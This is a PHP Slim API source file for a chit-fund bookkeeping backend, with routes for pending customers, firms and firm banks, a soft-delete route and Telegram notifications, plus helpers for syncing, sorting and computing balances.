//         $payments = $db->getdynamicRecord("SELECT a.chiti, SUM(a.amount) as amount, a.rcvddate, a.customer, a.note, CONCAT(e.firstname,' ' ,e.lastname) as customername ,a.paymentmode,f.tYpe FROM `received` a INNER JOIN ( SELECT chiti, MAX(rcvddate) AS 'rcvddate' FROM received b LEFT join chiti c on b.chiti = c.id where b.note != 'deducted' and c.status = 1 and b.rcvddate >'".$bfreday . "' and b.deleted = 0 and c.deleted = 0 GROUP BY b.chiti )d ON a.chiti = d.chiti AND a.rcvddate = d.rcvddate left JOIN customers e on a.customer = e.id left join chiti f on a.chiti = f.id WHERE a.deleted = 0 and e.deleted = 0 GROUP BY a.chiti ORDER BY `a`.`rcvddate` ASC ",3000);

// 		$params= $db->getFunctionParam("chiti");
// 		$getdata = array();
// 		for($i=0;$i<sizeof($params);$i++){
// 			if($params[$i]== 'date'){
// 				$tmp = array();
// 				$tmp["op"] = ">";
// 				$tmp["value"] = $bfreday;
// 				array_push($getdata,json_encode($tmp));
// 			}else if($params[$i]== 'status'){
// 				array_push($getdata,1);	
// 			}else{
// 				array_push($getdata,"");	
// 			}
// 		}
// 		$pendingchitiList = call_user_func_array(array($db,'getchiti'), $getdata);	

// 		for($j=0;$j<sizeof($pendingchitiList);$j++){
// 			$exist = false;
// 			for($k=0;$k<sizeof($payments);$k++){
// 				// echo json_encode($payments[$k]);
// 				// echo $pendingchitiList[$j]['id'];
// 				if($pendingchitiList[$j]['id'] == $payments[$k]['chiti']){
// 					$exist = true;
// 					break;
// 				}
// 			}
// 			if(!$exist){
// 				$tmparr = array(
// 					"id" => $pendingchitiList[$j]['id'],
// 					"customer" => $pendingchitiList[$j]['customer'],
// 					"amount" => 0,
// 					"rcvddate" => $pendingchitiList[$j]['date'],
// 					"asalu" => 0,
// 					"asaluid" => 0,
// 					"chiti" => $pendingchitiList[$j]['id'],
// 					"colid" => 0,
// 					"paymentmode" => 0,
// 					"pmid" => "",
// 					"note" => "not yet started",
// 					"created" => $pendingchitiList[$j]['created'],
// 					"updated" => $pendingchitiList[$j]['updated'],
// 					"deleted" => $pendingchitiList[$j]['deleted'],
// 					"customername" => $pendingchitiList[$j]['customername'],
// 					"latestdate" => $pendingchitiList[$j]['date'],
// 					"paymentmodename" => "",
// 				);
// 				array_push($payments,$tmparr);
// 			}
// 		}
// 		// usort($payments,"sortfunction");
// 		usort($payments, 'date_compare');
//         // $payments = $db->getdynamicRecord("SELECT a.*,CONCAT(c.firstname,' ' ,c.lastname) as customername,MAX(rcvddate) as latestdate,d.modename as paymentmodename FROM `received` a INNER join `chiti` b on a.chiti = b.id left join customers c on a.customer = c.id left join paymentmodes d on a.paymentmode= d.id  WHERE b.status = 1  and b.tYpe = 5 and a.note != 'deducted' and a.note != 'Deducted'  and b.date >'".$bfreday . "' and a.deleted = 0 and b.deleted = 0  GROUP BY a.chiti ORDER BY `latestdate` ASC",3000);
// 		//https://github.com/flutter/flutter/issues/97873
// 	if($payments && sizeof($payments) > 0){

// 		$response['status'] = "success";
// 		$response["message"] = "Successfully fetched Last Payments";
// 		$response["lastpayments"] = $payments;
// 		echoRespnse(200, $response);

// 	}else{
// 		$response['status'] = "success";
// 		$response["message"] = "No Data Found";
// 		$response["code"] = "NOTEXIST";
// 		echoRespnse(204, $response);
// 	}


// });



$app->get('/pendingcustomers', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	// $rcvdamtList = $db->getdynamicRecord("select * from ( select *,row_number() over(partition by customer order by rcvddate desc) as rn from received )A where rn=1 and A.chiti IN ($cid)",500);
	$rcvdamtList = $db->getdynamicRecord("select a.*,CONCAT(c.firstname,' ' ,c.lastname) as customername,CONCAT(d.firstname,' ' ,d.lastname) as haminame,b.status as status,e.modename as paymentmodename from ( select *, row_number() over(partition by chiti order by rcvddate desc) as rn from received )a LEFT JOIN chiti b on a.chiti=b.id LEFT JOIN customers c on a.customer=c.id LEFT JOIN customers d on c.hami = d.id LEFT JOIN paymentmodes e on a.paymentmode = e.id where rn=1 and b.status = 1 and a.deleted = 0 ", 3000);



	$response['status'] = "success";
	$response["message"] = "Successfully fetched pending customers list";
	$response["rcvdamtList"] = $rcvdamtList;
	echoRespnse(200, $response);

});


$app->post('/sendtelegram', function () use ($app) {

	// $Paymentmode = array();
	$msg = postParams($app->request->post('msg'));
	// $Paymentmode["opbal"] = postParams($app->request->post('opbal'));

	$db = new DbHandler();
	
	$teleStatus = sendTelegram(urlencode($msg), "full");

});

$app->get('/firm', function () use ($app) {

	$response = array();

	// fetching all parties
	$db = new DbHandler();

	$params = $db->getFunctionParam("firm");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}



	$firmList = call_user_func_array(array($db, 'getFirms'), $getdata);

	$firms = array();

	$outputfields = array("id", "name", "address", "city", "state", "statename", "postal", "aadhar", "gst", "phno1", "phno2", "initialcash", "presentbalance");
	$qryfields = array("id", "name", "address", "city", "state", "statename", "postal", "aadhar", "gst", "phno1", "phno2", "initialcash", "presentbalance");

	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($firmList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($firmList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $firmList[$i][$outputfields[$j]];
			}
		}
		array_push($firms, $tmp);
	}

	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	$response['total'] = call_user_func_array(array($db, 'getFirms'), $getdata)[0]["count(*)"];

	$response["message"] = "Successfully fetched firms info";
	$response["count"] = sizeOf($firms);
	$response["firms"] = $firms;
	echoRespnse(200, $response);

});

$app->get('/firm/:id', function ($id) use ($app) {

	$response = array();
	$db = new DbHandler();


	$params = $db->getFunctionParam("firm");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$firmList = call_user_func_array(array($db, 'getFirms'), $getdata);

	$firms = array();

	if (sizeof($firmList) > 0) {
		$firm = array();


		$outputfields = array("id", "name", "address", "city", "state", "statename", "statecode", "postal", "aadhar", "gst", "phno1", "phno2", "initialcash", "presentbalance", "created", "updated");
		$qryfields = array("id", "name", "address", "city", "state", "statename", "statecode", "postal", "aadhar", "gst", "phno1", "phno2", "initialcash", "presentbalance", "created", "updated");

		// looping through result and preparing tasks array
		for ($i = 0; $i < sizeOf($firmList); $i++) {
			$tmp = array();
			for ($j = 0; $j < sizeof($qryfields); $j++) {
				if (isset($firmList[$i][$outputfields[$j]])) {
					$tmp[$qryfields[$j]] = $firmList[$i][$outputfields[$j]];
				}
			}
			$firm = $tmp;
		}

		$params = $db->getFunctionParam("firmbank");
		$getdata = array();
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "firmid") {
				array_push($getdata, $id);
			} else {
				array_push($getdata, "");
			}
		}

		$bankList = call_user_func_array(array($db, 'getFirmBank'), $getdata);

		$banks = array();


		$outputfields = array("id", "name", "gst", "branch", "accno", "accname", "initialbalance", "presentbalance", "phno1", "phon2", "created", "updated");
		$qryfields = array("id", "name", "gst", "branch", "accno", "accname", "initialbalance", "presentbalance", "phno1", "phon2", "created", "updated");

		// looping through result and preparing tasks array
		for ($i = 0; $i < sizeOf($bankList); $i++) {
			$tmp = array();
			for ($j = 0; $j < sizeof($qryfields); $j++) {
				if (isset($bankList[$i][$outputfields[$j]])) {
					$tmp[$qryfields[$j]] = $bankList[$i][$outputfields[$j]];
				}
			}
			array_push($banks, $tmp);
		}
		$firm["banks"] = $banks;

		$response['status'] = "success";
		$response["message"] = "Successfully fetched firm info";
		$response["firm"] = $firm;
	} else {
		$response['status'] = "success";
		$response["message"] = "No firm Exist with given id";
		$response["code"] = "NOTEXIST";

	}
	echoRespnse(200, $response);

});


$app->delete('/firm/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("firm");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$cityDetail = call_user_func_array(array($db, 'getFirms'), $getdata);

	if (sizeof($cityDetail) > 0) {
		$params = $db->putFunctionParam("firm");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			array_push($putdata, "");

		}
		array_push($putdata, 1);
		$editDetail = call_user_func_array(array($db, 'editFirm'), $putdata);

		if ($editDetail) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully deleted firm information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while deleting firm information";
			$response["err"] = $editDetail;
		}


	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No User found with given ID";
	}
	echoRespnse(201, $response);

});
function verifyRequiredParams($required_fields)
{

	$error = false;
	$error_fields = "";
	$request_params = array();
	$request_params = $_REQUEST;

	// Handling PUT request params
	if ($_SERVER['REQUEST_METHOD'] == 'PUT') {
		$app = \Slim\Slim::getInstance();
		parse_str($app->request()->getBody(), $request_params);
	}
	foreach ($required_fields as $field) {
		if (!isset($request_params[$field]) || strlen(trim($request_params[$field])) <= 0) {
			$error = true;
			$error_fields .= $field . ', ';
		}
	}

	if ($error) {
		// Required field(s) are missing or empty
		// echo error json and stop the app
		$response = array();
		$app = \Slim\Slim::getInstance();
		$response["error"] = true;
		$response["message"] = 'Required field(s) ' . substr($error_fields, 0, -2) . ' is missing or empty';
		echoRespnse(400, $response);
		$app->stop();
	}
}



function echoRespnse($status_code, $response)
{
	$app = \Slim\Slim::getInstance();
	// Http response code
	$app->status($status_code);

	// setting response content type to json
	$app->contentType('application/json');

	echo json_encode($response);
}

function updateTable($db, $opParam, $mainId, $outputfields, $getFunction, $syncdata, $putFunction, $id, $tablename, $pmid)
{
	// echo "came";
	$params = $db->getFunctionParam($opParam);
	$getparamdata = array(); //$getexpensedata = array();
	for ($k = 0; $k < sizeof($params); $k++) {
		if ($tablename && $params[$k] == "tablename") {
			array_push($getparamdata, $tablename);
		} else {
			if ($params[$k] == $mainId) {
				array_push($getparamdata, $id);
			} else {
				array_push($getparamdata, "");
			}
		}
	}
	// echo $getFunction; echo json_encode($getparamdata);
	$olddata = call_user_func_array(array($db, $getFunction), $getparamdata);

	// echo "show";
	// echo json_encode($olddata);
	$deletedpmid = array();
	for ($j = 0; $j < sizeOf($olddata); $j++) {
		$action = "";
		$deletedData = true; //assume that this charge is been deleted
		$updateData = false; //assume that no changes is to be done for this charge
		if ($syncdata) {
			$newdata = array();
			$ind = getEditObject($olddata[$j]["id"], $syncdata);
			// echo json_encode($olddata[$j]["id"]); echo "--->"; echo $ind;
			if ($ind >= 0) { //if charge exist then get the index
				$deletedData = false; // ass charge found so less chance of deleting
				$newdata = json_decode(json_encode($syncdata), True);
				for ($k = 0; $k < sizeOf($outputfields); $k++) {
					if (!isset($newdata[$ind][$outputfields[$k]])) {
						$newdata[$ind][$outputfields[$k]] = "";
					}
					if (!isset($olddata[$j][$outputfields[$k]])) {
						$olddata[$j][$outputfields[$k]] = "";
					}
					if ($olddata[$j][$outputfields[$k]] != $newdata[$ind][$outputfields[$k]]) {
						$updateData = true;
						$action = "update";
						break;
					}
				}
				if ($updateData) { //if($action == "update")
					$params = $db->putFunctionParam($opParam);
					$updateField = array();
					$updateField["id"] = $olddata[$j]["id"];
					$putdata = array();
					array_push($putdata, $updateField);
					for ($i = 0; $i < sizeof($params); $i++) {
						if (!isset($newdata[$ind][$params[$i]])) {
							$newdata[$ind][$params[$i]] = "";
						}
						if ($params[$i] != $mainId) {
							array_push($putdata, $newdata[$ind][$params[$i]]);
						} else {
							array_push($putdata, "");
						}
					}
					array_push($putdata, "");
					$editDetail = call_user_func_array(array($db, $putFunction), $putdata);
				}
				unset($syncdata[$ind]);
				$syncdata = array_values($syncdata);
			} else {
				// echo json_encode($olddata[$j]);
				$deletedData = true;
			}
		} else { //if they removed the product from array
			$deletedData = true;
			$action = "delete";
		}

		if ($deletedData) {
			$params = $db->putFunctionParam($opParam);
			$updateField = array();
			$updateField["id"] = $olddata[$j]["id"];
			$putdata = array();
			array_push($putdata, $updateField);
			for ($i = 0; $i < sizeof($params); $i++) {
				array_push($putdata, "");
			}
			array_push($putdata, 1);
			$editDetail = call_user_func_array(array($db, $putFunction), $putdata);
			array_push($deletedpmid, $olddata[$j]["id"]);
		}
	}

	if (sizeof($deletedpmid) > 0) {
		if ($tablename == "drcr") {
			$paramsname = "drcr";
			$pmidgetfunc = "getdrcr";
			$pmidputfunc = "editdrcr";
		} else if ($tablename == "cftrans") {
			$paramsname = "cftrans";
			$pmidgetfunc = "getCfTrans";
			$pmidputfunc = "editCfTrans";
		} else if ($tablename == "chiti") {
			$paramsname = "chiti";
			$pmidgetfunc = "getchiti";
			$pmidputfunc = "editchiti";
		} else if ($tablename == "received") {
			$paramsname = "received";
			$pmidgetfunc = "getreceivedamount";
			$pmidputfunc = "editreceived";
		}

		//edit pmid
		// echo json_encode($deletedpmid);
		if (sizeof($pmid) > 0) {
			$tmp = array();
			for ($r = 0; $r < sizeof($pmid); $r++) { //oldpmids array
				$pmexist = false;
				for ($w = 0; $w < sizeof($deletedpmid); $w++) { //deleted pmids array
					if ($pmid[$r] == $deletedpmid[$w]) { //if deleted id exists
						$pmexist = true;
						break;
					}
				}
				if (!$pmexist) {
					array_push($tmp, $pmid[$r]);
				}
			}
			// echo sizeof($tmp);
			$params = $db->putFunctionParam($paramsname);
			$updateField = array();
			$updateField["id"] = $id;
			$putdata = array();
			array_push($putdata, $updateField);
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "pmid") {
					if (sizeof($tmp)) {
						array_push($putdata, implode(',', $tmp));
					} else {
						array_push($putdata, " ");
					}
				} else {
					array_push($putdata, "");
				}
			}
			array_push($putdata, "");
			$editDetail = call_user_func_array(array($db, $pmidputfunc), $putdata);
		}
	}

	$syncdata = json_decode(json_encode($syncdata), True);
	return $syncdata;
}


function diffmonths($fromdate, $todate)
{

}


function getEditObject($param, $dest)
{

	foreach ($dest as $key => $obj) {
		if (isset($obj->id) && ($obj->id == $param)) {
			// echo "w";echo $key;
			return $key;
		}
	}
	// echo "minus"; 
	return -1;
}


function postParams($param)
{
	if (isset($param)) {

		return $param;
	} else {
		return "";
	}
}


function getsum($obj, $param)
{
	$total = 0;
	if ($obj && sizeof($obj)) {
		for ($q = 0; $q < sizeOf($obj); $q++) {
			$total += $obj[$q][$param];
		}
	}
	return $total;
}



function getParams($param)
{
	if (isset($param)) {
		if (json_decode($param)) {
		}
		return $param;
	} else {
		return "";
	}
}

// function putParam($data,$param){
// 	// if($param == "credit"){
// 	// 	echo "1->"; echo gettype($data->{$param}); 
// 	// }
// 	if(isset($data->{$param})){
// 		if(($data->{$param}=="") && (gettype($data->{$param}) == "string")){
// 			return "EMPTY_PARAM";
// 		}
// 		// if($param == "credit"){
// 		// 	echo "2->"; echo $data->{$param}; 
// 		// }
// 		return $data->{$param};
// 	}
// 	else{
// 		// if($param == "credit"){
// 		// 	echo "3->"; echo $data->{$param}; 
// 		// }
// 		return "";
// 	}
// }


function date_compare($element1, $element2)
{
	$datetime1 = strtotime($element1['rcvddate']);
	$datetime2 = strtotime($element2['rcvddate']);
	return $datetime1 - $datetime2;
}

function sortPmtrans($obj1, $obj2)
{
	$rtnarr = array();
	$rtnarr[0] = '';
	$rtnarr[1] = $obj2;
	$pmtrans = array();
	if ($obj1["paymentmode"] == 50 && $obj1["pmid"]) {
		// echo "camein";
		// $obj1["pmtrans"] = array();
		$tmppmid = array();
		$tmppmid = explode(",", $obj1["pmid"]);
		// echo json_encode($tmppmid);
		for ($x = 0; $x < sizeof($tmppmid); $x++) { //deleted pmids array
			for ($w = 0; $w < sizeof($obj2); $w++) { //deleted pmids array
				if ($tmppmid[$x] == $obj2[$w]["id"]) {
					// echo "bfre".json_encode($obj1["pmtrans"]);
					array_push($pmtrans, $obj2[$w]);
					// echo "after".json_encode($obj1["pmtrans"]);
					unset($obj2[$w]);
					$obj2 = array_values($obj2);
					break;
				}
			}
		}
		// echo "final".json_encode($obj1["pmtrans"]);		
		$rtnarr[0] = $pmtrans;
		$rtnarr[1] = $obj2;
	}
	return $rtnarr;
}


function DateDiff($date1, $date2)
{
	// $date1 = new DateTime("2007-03-24");
	// $date2 = new DateTime("2009-06-26");
	$interval = $date1->diff($date2);
	// echo "difference " . $interval->y . " years, " . $interval->m." months, ".$interval->d." days "; 

	// shows the total amount of days (not divided into years, months and days like above)
	return $interval->days;
}


function getpmname($pmid, $arr)
{
	if ($arr && sizeof($arr)) {
		for ($r = 0; $r < sizeof($arr); $r++) {
			if ($pmid == $arr[$r]["id"]) {
				return $arr[$r]["modename"];
			}
		}
	}
}


function ismultiChanged($arr1, $arr2)
{
	if (sizeof($arr1) != sizeof($arr2)) {
		return true;
	} else {
		for ($t = 0; $t < sizeof($arr1); $t++) {
			if ($arr1[$t]["paymentmode"] != $arr2[$t]["paymentmode"] || $arr1[$t]["credit"] != $arr2[$t]["credit"] || $arr1[$t]["debit"] != $arr2[$t]["debit"]) {
				return false;
			}
		}

	}
}



function diffBtwDates($date1, $date2)
{
	$date1 = new DateTime($date1);
	$date2 = new DateTime($date2);
	$interval = $date1->diff($date2);
	// echo "difference " . $interval->y . " years, " . $interval->m." months, ".$interval->d." days "; 

	// shows the total amount of days (not divided into years, months and days like above)
	// echo "difference " . $interval->days . " days ";
	return $interval->days;
}

function sortArrayOfObjects($array, $column, $order = 'asc') {
    if (empty($array)) {
		echo "came  in empty";
        return $array; // Return the array as is if it's empty
    }

    // Create an array to store the values of the specified column
    $columnValues = array();
    
    foreach ($array as $key => $item) {
        // Check if the specified column exists in the object
		echo json_encode($columnValues);
        if (isset($item->$column)) {
            $columnValues[$key] = $item->$column;	
			echo "came  in column yes ".$item->$column;
        } else {
			$columnValues[$key] = null; // Use null for missing values
			echo "came  in column no ".json_encode($item);
        }
    }
	
    // Sort the original array based on the column values
    if ($order === 'asc') {
		echo "came  in column asc ";
        array_multisort($columnValues, SORT_ASC, $array);
    } else if ($order === 'dsc') {
		echo "came  in column dsc ";
        array_multisort($columnValues, SORT_DESC, $array);
    }

    return $array;
}

function sortArrayByDate($array, $order = 'asc') {
    if (empty($array)) {
        return $array; // Return the array as is if it's empty
    }

    // Extract the date values from the array
    $dateValues = array();
    foreach ($array as $item) {
        if (isset($item['date'])) {
            $dateValues[] = strtotime($item['date']); // Convert date to a timestamp for comparison
        } else {
            $dateValues[] = 0; // Use 0 for missing or invalid dates
        }
    }

    // Sort the original array based on the date values
    if ($order === 'asc') {
        array_multisort($dateValues, SORT_ASC, $array);
    } elseif ($order === 'dsc') {
        array_multisort($dateValues, SORT_DESC, $array);
    }

    return $array;
}


function calculateBalance($array,$opbal,$opasaluBal,$opinterestBal) {
    // Initialize the balance to 0
    $balance = (floatval($opbal))?sprintf("%.2f", $opbal):0;
	$asaluBal = (floatval($opasaluBal))?sprintf("%.2f", $opasaluBal):0;
	$interestBal = (floatval($opinterestBal))?sprintf("%.2f", $opinterestBal):0;
    // Loop through the array and update the balance for each object
    foreach ($array as &$entry) {
        // Convert debit and credit values to float
        $debit = sprintf("%.2f", $entry['debit']);
        $credit = sprintf("%.2f", $entry['credit']);

        // Calculate the balance for the current entry
        $entry['balance'] = $balance + $credit - $debit;
		if($entry['interestentry']){
			$entry['interestbal'] = $interestBal + $credit - $debit;
			$interestBal = $entry['interestbal'];
		}else{
			$entry['asalubal'] = $asaluBal + $credit - $debit;
			$asaluBal = $entry['asalubal'];
		}

        // Update the balance for the next entry
        $balance = sprintf("%.2f", $entry['balance']);
    }
    // echo $array."    ".$opbal."    ".$opasaluBal."    ".$opinterestBal;
    return $array;
}






function changeDateUserFormat($dte)
{
	//$orgDate = "2019-09-15";  
	return $newDate = date("d/m/Y", strtotime($dte));
	// echo "New date format is: ".$newDate. " (MM-DD-YYYY)";  
}


function sendTelegram($msg, $group){
	// echo "hi";
	//u can customise message like in main 
	if ($group == "main") {
		
		$url = "https://api.telegram.org/<bot id>/sendMessage?chat_id=<fill in chatid>&text=".$msg;		

	} else if ($group == "full") {		
		$url = "https://api.telegram.org/<bot id>/sendMessage?chat_id=<fill in chatid>&text=".$msg;
	}else if($group == "sanju"){
		
		$url = "https://api.telegram.org/<bot id>/sendMessage?chat_id=<fill in chatid>&text=".$msg;
		
	}

	$ch = curl_init();
	// set URL and other appropriate options
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 0);

	// grab URL and pass it to the browser
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	// grab URL and pass it to the browser  
	$output = curl_exec($ch);
	// echo $output;

	// close cURL resource, and free up system resources
	curl_close($ch);

	return $output;
}


function putParam($data, $param){
// echo $param."=== ".json_encode($data);
	if (isset($data->{$param})) {
		if ($data->{$param} == "") {
			if (gettype($data->{$param}) == "boolean") {
				return $data->{$param};
			}
			return "EMPTY_PARAM";
		}
		return $data->{$param};
	} else {
		return "";
	}
}

$app->run();


?>